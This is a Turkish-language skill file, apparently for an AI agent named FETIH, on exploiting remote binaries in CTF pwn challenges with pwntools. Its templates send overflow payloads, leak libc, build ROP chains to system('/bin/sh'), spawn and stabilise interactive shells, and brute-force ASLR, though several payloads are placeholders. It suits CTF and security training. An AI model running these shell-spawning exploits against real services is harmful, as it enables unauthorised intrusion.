---
name: remote-pwn
description: Remote binary exploitation — pwntools remote(), socket yönetimi, interactive shell
tags: [ctf, pwn, remote, pwntools, nc, socket, interactive, process-vs-remote]
triggers:
  - "nc challenge.ctf.site"
  - "remote binary"
  - "port numarası verilmiş"
  - "socat"
  - "xinetd"
  - "pwntools remote"
  - "interactive session"
difficulty: easy
category: pwn
solved_challenges:
  - "corCTF 2023 - smm-diary (QEMU remote)"
  - "Çoğu CTF pwn challenge"
adapted_for: fetih
---

# Remote Pwn — pwntools Remote Şablonu

## Local vs Remote Geçiş

Exploit geliştirme süreci:

1. **Local process** → hızlı iteration, gdb attach edilebilir
2. **Local socat** → xinetd/socat davranışını taklit et
3. **Remote** → gerçek sunucu

```python
#!/usr/bin/env python3
# remote_pwn_template.py — temel remote şablon

from pwn import *

# ── Ayarlar ─────────────────────────────────────────────────────────────────
BINARY      = "./vuln"
LIBC        = "./libc.so.6"        # ldd ./vuln ile bul
REMOTE_HOST = "challenge.ctf.site"
REMOTE_PORT = 1337

context.binary   = elf = ELF(BINARY)
libc = ELF(LIBC)
context.log_level = "info"   # debug yaparken "debug" yap

# ── Bağlantı: args.REMOTE / args.GDB ile geçiş ──────────────────────────────
def start():
    if args.REMOTE:
        return remote(REMOTE_HOST, REMOTE_PORT)
    if args.GDB:
        return gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    return process(BINARY)

GDB_SCRIPT = """
    break *main+120
    continue
"""

io = start()

# ── Payload gönder ───────────────────────────────────────────────────────────
OFFSET  = 72
payload = b"A" * OFFSET + p64(0xdeadbeef)

io.sendlineafter(b">>> ", payload)

# ── Shell al ─────────────────────────────────────────────────────────────────
io.interactive()
```

**Çalıştırma:**
```bash
# Local test
python3 exploit.py

# GDB ile debug
python3 exploit.py GDB

# Remote
python3 exploit.py REMOTE

# Remote host/port override
python3 exploit.py REMOTE HOST=other.ctf.site PORT=9999
```

---

## Tam pwntools Remote Şablonu

```python
#!/usr/bin/env python3
# full_remote_template.py — production hazır şablon

from pwn import *
import sys

# ── Konfigürasyon ─────────────────────────────────────────────────────────────
BINARY      = "./vuln"
LIBC        = "./libc.so.6"
REMOTE_HOST = "chall.example.com"
REMOTE_PORT = 31337

context.binary    = elf  = ELF(BINARY)
libc              = ELF(LIBC)
context.log_level = "info"

# ── Yardımcı Fonksiyonlar ─────────────────────────────────────────────────────
def start():
    """Local, GDB veya Remote bağlantı başlat."""
    if args.REMOTE:
        log.info(f"Bağlanıyor: {REMOTE_HOST}:{REMOTE_PORT}")
        tube = remote(REMOTE_HOST, REMOTE_PORT)
    elif args.GDB:
        tube = gdb.debug([BINARY], env={"LD_PRELOAD": LIBC}, gdbscript="""
            set follow-fork-mode child
            break main
            continue
        """)
    else:
        tube = process([BINARY], env={"LD_PRELOAD": LIBC})
    return tube

def send_payload(io, payload, prompt=b">>> "):
    """Prompt bekle, payload gönder."""
    io.recvuntil(prompt)
    io.send(payload)

def recv_leak(io, size=8):
    """N byte al, little-endian integer'a çevir."""
    data = io.recv(size).ljust(8, b"\x00")
    return u64(data)

# ── Exploit Akışı ─────────────────────────────────────────────────────────────
def exploit():
    io = start()

    # ── Stage 1 ────────────────────────────────────────────────────────────────
    log.info("Stage 1: Libc leak")
    payload1 = b"A" * 72        # OFFSET — değiştir
    payload1 += b"..."           # ROP zinciri

    send_payload(io, payload1)
    libc_leak = recv_leak(io)
    libc.address = libc_leak - libc.sym["puts"]
    log.success(f"libc base = {hex(libc.address)}")

    # ── Stage 2 ────────────────────────────────────────────────────────────────
    log.info("Stage 2: Shell")
    payload2 = b"..."           # shell payload

    send_payload(io, payload2)

    # ── Shell ──────────────────────────────────────────────────────────────────
    log.success("Shell alınıyor!")
    io.interactive()

if __name__ == "__main__":
    exploit()
```

---

## Bağlantı Sorunları

### Timeout
```python
# Varsayılan timeout çok kısa olabilir
io = remote(HOST, PORT, timeout=30)

# Tek bir recv için özel timeout
data = io.recv(timeout=10)
if not data:
    log.warning("Boş yanıt — sunucu meşgul olabilir")
```

### SIGPIPE (Broken Pipe)
```python
# Sunucu bağlantıyı kapattıysa sendline() çökebilir
import signal
signal.signal(signal.SIGPIPE, signal.SIG_DFL)

# Ya da try/except kullan:
try:
    io.sendline(payload)
except EOFError:
    log.error("Sunucu bağlantıyı kapattı — exploit çalışmadı")
    io.close()
    sys.exit(1)
```

### Recvuntil Zaman Aşımı
```python
# Eğer prompt hiç gelmiyorsa:
io.recvuntil(b">>> ", timeout=5)   # 5 saniye bekle

# Alternatif: recvline ile satır satır oku
for line in io.recvlines(5):
    log.debug(line)
```

### SSL/TLS Bağlantı
```python
# Bazı CTF'ler TLS üzerinden sunar
io = remote(HOST, PORT, ssl=True)
```

---

## GDB ile Remote Debug (gdbserver)

```bash
# Sunucuda (eğer erişimin varsa):
gdbserver 0.0.0.0:4444 ./vuln

# Yerel makinede:
gdb ./vuln
(gdb) target remote challenge.ctf.site:4444
(gdb) continue
```

pwntools ile:
```python
# Local socat ile xinetd simülasyonu
# Terminal 1:
# socat TCP-LISTEN:4444,reuseaddr,fork EXEC:"./vuln"

# exploit.py içinde:
io = remote("127.0.0.1", 4444)

# Attach için ayrı terminal:
# gdb -p $(pgrep vuln)
```

### pwndbg GDB Script ile Otomatik Debug

```python
GDB_SCRIPT = """
    # Adresi sabit yap (ASLR kapat — sadece local)
    set disable-randomization on

    # Breakpoint'ler
    break *vuln+42
    break *main+100

    # Heap debug
    set environment MALLOC_CHECK_=3

    # pwndbg komutları (pwndbg yüklüyse)
    # heap
    # bins
    # telescope $rsp 20

    continue
"""

io = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
```

---

## Interactive Shell Alma

### Basit interactive()
```python
# Shell aldıktan sonra:
io.interactive()
# Artık terminale komut girebilirsin: ls, cat flag.txt, id
```

### Flag Otomatik Çek
```python
# CTF otomasyonu — interactive açmadan flag al
io.sendline(b"cat flag.txt")
flag = io.recvline().decode().strip()
log.success(f"FLAG: {flag}")
io.close()
```

### Shell Stabilizasyonu (tty upgrade)
Remote shell bazen ham — tab completion, ctrl+c yok:

```python
# Shell aldıktan sonra:
io.sendline(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
# Sonra:
# Ctrl+Z → fg → reset
# Yerel terminalde: stty raw -echo; fg
```

### Birden Fazla Deneme (retry loop)
ASLR veya heap adresi için bruteforce:

```python
for attempt in range(100):
    try:
        io = start()
        exploit(io)
        break
    except EOFError:
        log.warning(f"Deneme {attempt} başarısız, tekrar...")
        io.close()
        continue
```

---

## Socat ile Local Server (xinetd Simülasyonu)

```bash
# Terminal 1 — binary'yi socat üzerinden sun:
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:"./vuln"

# Terminal 2 — exploit:
python3 exploit.py REMOTE HOST=127.0.0.1 PORT=4444

# Ya da manuel nc:
nc 127.0.0.1 4444
```

Bu yöntem, xinetd/socat ortamındaki davranışı (stdin/stdout pipe) taklit eder.
Bazı binary'ler `isatty()` kontrolü yapar — socat gerçeği simüle eder.

---

## Hata Ayıklama Checklist

```
[ ] OFFSET doğru mu? — cyclic + gdb ile kontrol et
[ ] Libc versiyonu eşleşiyor mu? — ldd + libc.blukat.me
[ ] Stack alignment sorunuÖ? — ret gadget ekle
[ ] Prompt doğru mu? — io.recvuntil(b"GERÇEK_PROMPT")
[ ] Binary local'de çalışıyor mu? — önce args.GDB ile test et
[ ] Timeout sorunuÖ? — recv/send timeout parametrelerini artır
[ ] Remote vs local fark var mı? — context.log_level = "debug" ile karşılaştır
```

---

## Yararlı pwntools Snippet'leri

```python
# Bağlantı bilgisi yaz
log.info(io.lhost + ":" + str(io.lport))

# Binary'den string search
next(elf.search(b"/bin/sh"))

# Birden fazla libc symbol ara
for sym in ["system", "execve", "popen"]:
    log.info(f"{sym} = {hex(libc.sym[sym])}")

# ROP zinciri otomatik oluştur
rop = ROP([elf, libc])
rop.call("system", [next(libc.search(b"/bin/sh"))])
log.info(rop.dump())

# Cyclic ile offset bul
pattern = cyclic(200)
# gdb'de crash sonrası:
# pwndbg: cyclic -l $rbp_value
offset = cyclic_find(0x6161616b)   # little-endian 4 byte
log.info(f"Offset: {offset}")
```

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 02e38647deb3e4fd
-->

